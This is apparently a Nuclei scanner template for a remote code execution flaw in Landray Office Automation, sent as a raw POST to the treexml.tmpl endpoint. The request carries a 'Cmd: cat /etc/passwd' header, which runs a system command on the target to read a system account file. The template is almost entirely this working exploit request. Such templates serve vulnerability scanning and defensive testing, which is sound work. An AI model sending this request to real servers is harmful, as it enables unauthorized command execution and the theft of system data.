id: landray-office-automation-rce

info:
  name: Landray Office Automation RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template exploits a remote code execution vulnerability in Landray Office Automation by leveraging the `treexml.tmpl` endpoint. The issue allows attackers to execute arbitrary system commands.
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20treexml.tmpl%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
    - https://avd.aliyun.com/detail?id=AVD-2022-1341263

http:
  - raw:
      - |
        POST /data/sys-common/treexml.tmpl HTTP/1.1
        Host: {{Hostname}}
        Cmd: cat /etc/passwd
        Content-Type: application/x-www-form-urlencoded
        Pragma: no-cache

